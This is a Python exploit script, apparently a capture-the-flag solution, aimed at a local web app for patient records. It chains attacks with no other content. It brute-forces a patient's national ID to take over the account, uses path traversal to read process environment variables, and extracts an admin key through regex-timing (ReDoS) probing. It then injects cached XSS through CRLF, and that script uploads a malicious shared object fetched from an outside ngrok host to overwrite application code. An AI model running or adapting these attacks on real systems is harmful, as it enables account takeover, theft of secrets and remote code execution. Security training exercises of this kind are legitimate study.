 


import time,string,json
from requests import get,post
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

governorate_map = {
        "01": "Cairo", "02": "Alexandria", "03": "Port Said", "04": "Suez",
        "11": "Damietta", "12": "Dakahlia", "13": "Sharkia", "14": "Qaliubiya",
        "15": "Kafr El Sheikh", "16": "Gharbiya", "17": "Menofia", "18": "Beheira",
        "19": "Ismailia", "21": "Giza", "22": "Beni Suef", "23": "Fayoum",
        "24": "Minya", "25": "Assiut", "26": "Sohag", "27": "Qena",
        "28": "Aswan", "29": "Luxor", "31": "Red Sea", "32": "New Valley",
        "33": "Matruh", "34": "North Sinai", "35": "South Sinai"
}

HOST = "localhost:81"
ngrok = "4b282fa7b407.ngrok-free.app"
 
cookies = {}
found_id_lock = Lock()
found_id = None
national_id = ""
gender = 0

test_account = {"name":"Mohamed","username":"test","email":"test@example.com","national_id":"30305191601501","password":"30305191601501","date_of_birth":"2003-05-19","governrate":"Gharbiya","gender":1}
def register():
    post(f"http://{HOST}/api/register", json=test_account)

def login():
    global cookies
    resp=post(f"http://{HOST}/api/login", json={"username": test_account["username"], "password": test_account["national_id"]}, allow_redirects=False)
    if resp.status_code!=302:
        print("[-] Login failed")
        exit(1)
    print("[+] Logged in successfully")
    cookies["auth"]=resp.cookies.get("auth")
    return resp.cookies.get("auth")

def get_data():
    global national_id,cookies,gender
    resp = get(f"http://{HOST}/api/profile/patient_test",cookies=cookies)
    if resp.status_code == 200:
        profile = resp.json()
        if isinstance(profile, dict) and 'data' in profile:
            user_data = profile['data']
            dob = user_data.get('date_of_birth')
            governrate = user_data.get('governrate')
            gender = True if user_data.get('gender') == "male" else False
            
            if dob:
                year, month, day = dob.split('-')
                yy = year[2:4] 
                national_id += "2" if int(year)< 2000 else "3" + yy + month + day
            
            rev_map = {v: k for k, v in governorate_map.items()}
            if governrate in rev_map:
                national_id += rev_map[governrate]
            
            print(f"[+] DOB: {dob}")
            print(f"[+] Governrate: {governrate}")
            print(f"[+] Gender: {gender}")
            print(f"[+] National ID so far: {national_id}")
        else:
            print(f"[-] Unexpected response format: {profile}")
    else:
        print(f"[-] Request failed with status {resp.status_code}")

def brute_national_id():
    global national_id, gender, cookies, found_id, found_id_lock
    
    def check_id(i):
        global found_id
        with found_id_lock:
            if found_id is not None:
                return None
        
        formatted = "%05d" % i
        if int(formatted[-2]) % 2 == gender:
            try:
                resp = post(f"http://{HOST}/api/login", json={"username": "patient_test", "password": national_id + formatted}, allow_redirects=False, timeout=10)
                if resp.status_code == 302:
                    with found_id_lock:
                        if found_id is None:
                            found_id = national_id + formatted
                            print(f"[+] Found matching national ID: {found_id}")
                            cookies["auth"] = resp.cookies.get("auth")
                            return found_id
            except Exception as e:
                pass
        return None
    
    with ThreadPoolExecutor(max_workers=16) as executor:
        futures = [executor.submit(check_id, i) for i in range(0, 100000)]
        for future in as_completed(futures):
            result = future.result()
            if result:
                return result
    
    return found_id

def update_profile():
    global cookies,national_id,gender
    updated_data = {
        "name": "Updated",
        "email": "updated@example.com",
        "username": "../../proc/18/environ",
    }
    resp = post(f"http://{HOST}/api/profile", json=updated_data, cookies=cookies)
    if resp.status_code == 200:
        print("[+] Profile updated successfully")
    else:
        print(f"[-] Failed to update profile with status {resp.status_code}")
    cookies["auth"]=resp.cookies.get("auth")

def get_request_duration(regex_pattern: str) -> float:
    global cookies
    url = f"http://{HOST}/api/send-message"
    payload = {"Illness": regex_pattern, "message": "a"}

    try:
        start = time.time()
        resp = post(url, json=payload, cookies=cookies, timeout=15)
        _ = resp.status_code
        end = time.time()
        return end - start
    except Exception:
        return -1


def brute_admin_key(length: int = 32):
    chars = "abcdef" + string.digits
    key = []

    for pos in range(length):
        print(f"[*] Position {pos}")
        found = False

        for ch in chars:
            payload = rf"(?=^.*ADMIN_KEY=.{{{pos}}}{ch})(((.*)*)*)*salt$"
            duration = get_request_duration(payload)

            if duration >= 2:
                print(f"    [+] {pos}:{ch}")
                key.append(ch)
                found = True
                break

        if not found:
            key.append("?")

    print("Recovered ADMIN_KEY:", "".join(key))
    cookies["ADMIN_KEY"]="".join(key)
    return "".join(key)

def cache_xss():
    global cookies
    html = """<script>
            fetch("/api/upload-document", {
  method: "POST",
  body: '{"filename":"../utils/auth.so","file_url":"\\x3c\\x55\\x52\\x4c\\x3ahttp://"""+ngrok+"""/auth.so>"}',
  credentials: "include",
  headers: {
    "Content-Type": "application/json"
  }
}).then(response =>{
    fetch("/api/upload-document", {
      method: "POST",
      body: '{"filename":"../utils/__pycache__/trigger.pyc","file_url":"http://example.com/foo"}',
      credentials: "include",
      headers: {
        "Content-Type": "application/json"
      }
    }).then(response2 => {
        fetch("/api/upload-document", {
          method: "POST",
          body: '{"filename":"../../../../../../../../../app/utils/__pycache__/trigger.pyc","file_url":"http://example.com/bar"}',
          credentials: "include",
          headers: {
            "Content-Type": "application/json"
          }
        });
    });
});</script>"""
    test_data = {
        "headers": {
            f"""lol\r\n\r\n{html}""": "lol"
        }
    }
    print(get(f'http://{HOST}/api/health', params={"test": json.dumps(test_data)}, cookies=cookies).text)

def send_bot():
    resp = get(f'http://{HOST}/api/bot')

if __name__ == "__main__":
    print("[*] Registering test account...")
    register()

    print("[*] Logging in as test account...")
    login()

    print("[*] Fetching patient_test profile data...")
    get_data()
    
    print("\n[*] Bruteforcing remaining national ID digits...")
    recovered_national_id = brute_national_id()
    print(f"[+] Recovered national ID: {recovered_national_id}")
    test_account["username"]= "patient_test"
    test_account["password"]= recovered_national_id
    test_account["national_id"]= recovered_national_id

    print(f"\n[*] Attempting to login as patient_test with recovered national_id: {recovered_national_id}")
    login()

    print("[*] Updating profile to exploit Path Traversal...")
    update_profile()
    
    print("\n[*] Bruteforcing ADMIN_KEY...")
    brute_admin_key()
    cache_xss()
    send_bot()
    send_bot()